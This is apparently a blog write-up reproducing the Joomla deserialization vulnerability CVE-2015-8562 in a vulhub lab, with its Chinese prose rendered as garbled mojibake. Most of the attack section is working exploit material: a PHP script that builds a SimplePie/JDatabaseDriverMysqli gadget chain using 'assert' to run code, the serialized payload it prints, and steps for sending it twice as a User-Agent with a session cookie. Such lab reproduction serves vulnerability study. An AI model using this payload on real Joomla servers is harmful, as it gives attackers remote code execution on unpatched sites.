---
title: joomla ååºåˆ—åŒ–æ¼æ´(CVE-2015-8562)
date: 2021-12-13 12:36:07
tags: æ¼æ´å¤ç°
cover: https://w.wallhaven.cc/full/q2/wallhaven-q2pe2l.jpg
---

# joomla ååºåˆ—åŒ–æ¼æ´(CVE-2015-8562)

## 1.ç®€ä»‹

æœ¬æ¼æ´æ ¹æºæ˜¯PHP5.6.13å‰çš„ç‰ˆæœ¬åœ¨è¯»å–å­˜å‚¨å¥½çš„sessionæ—¶ï¼Œå¦‚æœååºåˆ—åŒ–å‡ºé”™åˆ™ä¼šè·³è¿‡å½“å‰ä¸€æ®µæ•°æ®è€Œå»ååºåˆ—åŒ–ä¸‹ä¸€æ®µæ•°æ®ã€‚è€ŒJoomlaå°†sessionå­˜å‚¨åœ¨Mysqlæ•°æ®åº“ä¸­ï¼Œç¼–ç æ˜¯utf8ï¼Œå½“æˆ‘ä»¬æ’å…¥4å­—èŠ‚çš„utf8æ•°æ®æ—¶åˆ™ä¼šå¯¼è‡´æˆªæ–­ã€‚æˆªæ–­åçš„æ•°æ®åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šå¤±è´¥ï¼Œæœ€åè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚

## 2.å½±å“ç‰ˆæœ¬

 - Joomla 1.5.x, 2.x, and 3.x before 3.4.6
 - PHP 5.6 < 5.6.13, PHP 5.5 < 5.5.29 and PHP 5.4 < 5.4.45

## 3.å¤ç°è¿‡ç¨‹

è¿™é‡Œä½¿ç”¨vulhubæ­å»ºç¯å¢ƒ

![image-20211213140734457](https://raw.githubusercontent.com/todis21/image/main/img/image-20211213140734457.png)

ç¯å¢ƒå¯åŠ¨åè®¿é—®`http://your-ip:8080/`ï¼ŒæŒ‰ç…§æŒ‡ç¤ºå®‰è£…å³å¯

è¿æ¥æ•°æ®åº“ï¼š

![image-20211213141146828](https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141146828.png)

![image-20211213141233555](https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141233555.png)

å®‰è£…å®Œæˆåï¼Œè®¿é—®ä¸»é¡µï¼ŒæŠ“ä¸ªåŒ…

![image-20211213141515900](https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141515900.png)

å…ˆæŠŠUAå¤´å’ŒCookieåˆ é™¤ï¼Œæ„é€ æ•°æ®åŒ…ï¼Œè®©æœåŠ¡å™¨è¿”å›Cookie

![image-20211213142010321](https://raw.githubusercontent.com/todis21/image/main/img/image-20211213142010321.png)

å‘èµ·è¯·æ±‚ï¼š

```
GET / HTTP/1.1
Host: ip:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.10.128:8080/installation/index.php
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

è¿”å›çš„Cookie:

```
43624f23bf50e5adc955be0e11ed9c2c=390eadc4a6ec125ef32fc0c28c5589be
```

ç„¶ååˆ©ç”¨åˆ«äººçš„expç”ŸæˆPOC

```php
<?php
class JSimplepieFactory {
}
class JDatabaseDriverMysql {

}
class SimplePie {
    var $sanitize;
    var $cache;
    var $cache_name_function;
    var $javascript;
    var $feed_url;
    function __construct()
    {
        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
        $this->javascript = 9999;
        $this->cache_name_function = "assert";
        $this->sanitize = new JDatabaseDriverMysql();
        $this->cache = true;
    }
}

class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function __construct()
    {
        $this->a = new JSimplepieFactory();
        $x = new SimplePie();
        $this->connection = 1;
        $this->disconnectHandlers = [
            [$x, "init"],
        ];
    }
}

$a = new JDatabaseDriverMysqli();
$poc = serialize($a);

$poc = str_replace("\x00*\x00", '\\0\\0\\0', $poc);

echo "123}__test|{$poc}\xF0\x9D\x8C\x86";


```

è¿è¡Œç”Ÿæˆçš„POC

```
123}__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}ğŒ†

```

å°†è¿™ä¸ªPOCä½œä¸ºUser-Agentï¼Œå¸¦ä¸Šåˆšè·å–çš„Cookieå‘åŒ…ï¼Œè¿ç»­å‘ä¸¤æ¬¡è¿™ä¸ªåŒ…ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡å‘åŒ…ï¼Œè®©è¿™ä¸ªæ¶æ„æ„é€ çš„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œç¬¬äºŒæ¬¡å‘åŒ…ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«æ‰§è¡Œ

![image-20211213144219455](https://raw.githubusercontent.com/todis21/image/main/img/image-20211213144219455.png)

